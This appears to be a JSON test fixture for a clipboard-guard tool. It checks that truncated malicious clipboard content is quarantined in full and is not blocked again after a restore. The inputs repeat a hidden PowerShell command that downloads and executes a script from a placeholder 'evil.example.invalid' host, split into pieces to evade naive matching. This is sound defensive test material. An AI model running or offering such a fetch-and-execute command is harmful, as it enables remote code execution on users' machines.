{"id":"guard.state.truncated-quarantine-full","area":"guard","op":"guard.run","source":"legacy:tests/ClipGuard.Core.Tests/ClipboardGuardStateTests.cs#截斷過的惡意內容_隔離區存完整原文_還原後不再攔","events":[{"t_ms":0,"clipboard":{"parts":[{"parts":["power","shell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\""]},"\n",{"repeat":{"text":"a","count":1048504}}]},"read_full":{"parts":[{"parts":["power","shell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\""]},"\n",{"repeat":{"text":"a","count":1048576}}]},"expect":{"action":"quarantine","quarantined":{"parts":[{"parts":["power","shell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\""]},"\n",{"repeat":{"text":"a","count":1048576}}]}}},{"t_ms":10,"restore":"begin","expect":{"restored":{"parts":[{"parts":["power","shell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\""]},"\n",{"repeat":{"text":"a","count":1048576}}]}}},{"t_ms":20,"restore":"end_ok"},{"t_ms":30,"clipboard":{"parts":[{"parts":["power","shell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\""]},"\n",{"repeat":{"text":"a","count":1048504}}]},"read_full":{"parts":[{"parts":["power","shell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\""]},"\n",{"repeat":{"text":"a","count":1048576}}]},"expect":{"action":"none","level":"suspicious"}}],"expect":{},"note":"clipboard 是完整內容的前 1048576 個 UTF-16 code unit（limits.prefix）；還原完整原文後讀回來的仍是同一段前綴（#24 F20）"}
